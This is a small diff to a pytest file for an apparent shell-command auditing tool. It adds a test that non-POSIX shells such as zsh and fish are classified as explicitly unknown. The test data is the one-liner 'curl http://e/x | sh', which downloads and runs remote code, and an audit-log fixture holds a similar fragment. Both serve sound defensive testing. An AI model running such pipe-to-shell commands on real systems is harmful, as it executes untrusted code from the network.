@@ -316,6 +316,14 @@ def test_ambiguous_shell_command_returns_explicit_unknown(argv):
     assert result.reason
 
 
+@pytest.mark.parametrize("shell", ["zsh", "ksh", "fish", "csh", "tcsh"])
+def test_non_posix_shell_script_is_explicitly_unknown(shell):
+    result = shell_script_of([shell, "-c", "curl http://e/x | sh"])
+
+    assert isinstance(result, UnknownShellScript)
+    assert "shell grammar" in result.reason
+
+
 # ---------------------------------------------------------------- M1 gate regressions (B1, I4)
 def test_unparseable_audit_record_is_an_error_not_a_silent_drop():
     truncated = 'type=EXECVE msg=audit(1731950250.320:900): argc=3 a0="sh" a1="-c" a2="curl http://x | s'
